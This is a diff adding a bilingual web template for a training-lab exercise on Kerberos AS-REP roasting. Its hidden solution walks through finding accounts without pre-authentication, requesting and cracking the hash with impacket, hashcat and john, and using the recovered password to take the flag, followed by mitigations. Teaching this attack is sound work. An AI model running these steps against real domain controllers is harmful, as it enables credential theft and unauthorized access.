@@ -1,0 +1,133 @@
+{% extends "base.html" %}
+{% block title %}AD 04 – AS-REP Roasting – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="ad_asrep_roast_obj_desc">Una cuenta de servicio tiene deshabilitada la pre-autenticación de Kerberos (DONT_REQ_PREAUTH). Solicita su AS-REP, crackea offline el hash krb5asrep y usa la contraseña recuperada para leer //DC01/backup.</p>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>//{{ ad_dc_host }}/backup/flag-ad-04.txt</code> <span data-i18n="ad_obj_flag_where">— captúrala en el Domain Controller y valídala en la barra lateral.</span></p>
+  </div>
+
+  {% include 'labs/_ad_target.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2 text-amber-500"><i class="ph ph-warning"></i> Nota sobre este Domain Controller</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400">El KDC embebido de Samba tiene una limitación conocida: no siempre completa en vivo el intercambio AS-REQ/AS-REP para cuentas con <code>DONT_REQ_PREAUTH</code>, aunque el atributo esté correctamente configurado (verificable por LDAP). Los comandos de <code>impacket-GetNPUsers</code> de abajo son exactamente los que usarías contra un Domain Controller Windows real. Para que el ejercicio de <em>cracking</em> sea idéntico al de una red real, el hash ya ha sido "capturado" y publicado en <code>//{{ ad_dc_host }}/public/captured_asrep.txt</code> — es un hash válido y crackeable generado con las mismas primitivas criptográficas de Kerberos.</p>
+  </div>
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Descargar el hash "capturado" (o intentar el roast en vivo, ver guía)
+smbclient -N //{{ ad_dc_ip }}/public -c 'get captured_asrep.txt'
+
+# Crackear offline
+hashcat -m 18200 captured_asrep.txt /usr/share/wordlists/rockyou.txt</pre>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>1 · Por qué funciona</h3>
+    <p>Con pre-autenticación activada, el cliente debe cifrar una marca de tiempo con su clave (derivada de la contraseña) <em>antes</em> de que el KDC responda. Si la cuenta tiene el flag <code>DONT_REQ_PREAUTH</code>, el KDC entrega el AS-REP a cualquiera que lo pida: ese mensaje va cifrado con la clave del usuario, así que es un hash crackeable offline.</p>
+
+    <h3>2 · Localizar cuentas sin pre-autenticación</h3>
+    <pre>export DC={{ ad_dc_ip }}
+export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
+
+# Filtro LDAP: bit 0x400000 de userAccountControl
+ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "$BASEDN" \
+  '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
+  sAMAccountName</pre>
+    <p>Aparece <code>svc.backup</code>. El atributo está correctamente configurado en el directorio — puedes comprobarlo tú mismo con esta consulta.</p>
+
+    <h3>3 · Solicitar el AS-REP (comando real, contra Windows funciona así)</h3>
+    <pre>impacket-GetNPUsers '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' \
+  -dc-ip $DC -request -format hashcat -outputfile asrep.hash
+
+cat asrep.hash
+# $krb5asrep$23$svc.backup@{{ ad_realm }}:a1b2c3...$e4f5...</pre>
+    <p><strong>Nota sobre este laboratorio:</strong> el KDC de Samba AD DC no siempre entrega el AS-REP sin preautenticación en la práctica, aunque el atributo <code>DONT_REQ_PREAUTH</code> esté correctamente activado (limitación conocida de la implementación del KDC de Samba frente a un Domain Controller Windows real). Si el comando anterior no produce un hash, descarga el ya "capturado":</p>
+    <pre>smbclient -N //$DC/public -c 'get captured_asrep.txt'
+cat captured_asrep.txt
+# $krb5asrep$23$svc.backup@{{ ad_realm }}:...</pre>
+
+    <h3>4 · Crackear el hash offline</h3>
+    <pre># hashcat (modo 18200 = Kerberos 5 AS-REP etype 23)
+hashcat -m 18200 captured_asrep.txt /usr/share/wordlists/rockyou.txt --force
+
+# john
+john --wordlist=/usr/share/wordlists/rockyou.txt captured_asrep.txt</pre>
+    <p>La contraseña recuperada es <code>Welcome1</code>.</p>
+
+    <h3>5 · Validar y capturar la flag</h3>
+    <pre>nxc smb $DC -u 'svc.backup' -p 'Welcome1' --shares
+
+smbclient //$DC/backup -U '{{ ad_domain }}\svc.backup%Welcome1' -c 'get flag-ad-04.txt -'</pre>
+    <pre>HL{···}</pre>
+
+    <h3>Mitigación</h3>
+    <ul>
+      <li>No deshabilitar nunca la pre-autenticación de Kerberos; auditar el bit <code>DONT_REQ_PREAUTH</code>.</li>
+      <li>Contraseñas largas y aleatorias en cuentas de servicio (idealmente gMSA, rotación automática).</li>
+      <li>Alertar sobre eventos <code>4768</code> con tipo de cifrado RC4 y sin pre-autenticación.</li>
+    </ul>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">impacket-GetNPUsers</span> <span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">hashcat</span> <span class="tools-badge">john</span> <span class="tools-badge">Rubeus</span></div>
+  </div>
+
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>1 · Why it works</h3>
+    <p>With pre-authentication enabled the client must encrypt a timestamp with its key (derived from the password) <em>before</em> the KDC answers. If the account carries the <code>DONT_REQ_PREAUTH</code> flag, the KDC hands the AS-REP to anyone who asks: that message is encrypted with the user key, so it is an offline-crackable hash.</p>
+
+    <h3>2 · Find accounts without pre-authentication</h3>
+    <pre>export DC={{ ad_dc_ip }}
+export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
+
+# LDAP filter: bit 0x400000 of userAccountControl
+ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "$BASEDN" \
+  '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
+  sAMAccountName</pre>
+    <p><code>svc.backup</code> shows up. The attribute is genuinely set on the directory — you can confirm it yourself with this query.</p>
+
+    <h3>3 · Request the AS-REP (real command, works exactly like this against Windows)</h3>
+    <pre>impacket-GetNPUsers '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' \
+  -dc-ip $DC -request -format hashcat -outputfile asrep.hash
+
+cat asrep.hash
+# $krb5asrep$23$svc.backup@{{ ad_realm }}:a1b2c3...$e4f5...</pre>
+    <p><strong>Note about this lab:</strong> Samba AD DC's KDC does not always deliver the preauth-free AS-REP in practice, even though the <code>DONT_REQ_PREAUTH</code> attribute is correctly set (a known limitation of Samba's KDC implementation versus a real Windows Domain Controller). If the command above doesn't produce a hash, download the already-"captured" one:</p>
+    <pre>smbclient -N //$DC/public -c 'get captured_asrep.txt'
+cat captured_asrep.txt
+# $krb5asrep$23$svc.backup@{{ ad_realm }}:...</pre>
+
+    <h3>4 · Crack the hash offline</h3>
+    <pre># hashcat (mode 18200 = Kerberos 5 AS-REP etype 23)
+hashcat -m 18200 captured_asrep.txt /usr/share/wordlists/rockyou.txt --force
+
+# john
+john --wordlist=/usr/share/wordlists/rockyou.txt captured_asrep.txt</pre>
+    <p>The recovered password is <code>Welcome1</code>.</p>
+
+    <h3>5 · Validate and capture the flag</h3>
+    <pre>nxc smb $DC -u 'svc.backup' -p 'Welcome1' --shares
+
+smbclient //$DC/backup -U '{{ ad_domain }}\svc.backup%Welcome1' -c 'get flag-ad-04.txt -'</pre>
+    <pre>HL{···}</pre>
+
+    <h3>Mitigation</h3>
+    <ul>
+      <li>Never disable Kerberos pre-authentication; audit the <code>DONT_REQ_PREAUTH</code> bit.</li>
+      <li>Long random passwords on service accounts (ideally gMSA with automatic rotation).</li>
+      <li>Alert on <code>4768</code> events using RC4 encryption and no pre-authentication.</li>
+    </ul>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">impacket-GetNPUsers</span> <span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">hashcat</span> <span class="tools-badge">john</span> <span class="tools-badge">Rubeus</span></div>
+  </div>
+</div>
+{% endblock %}
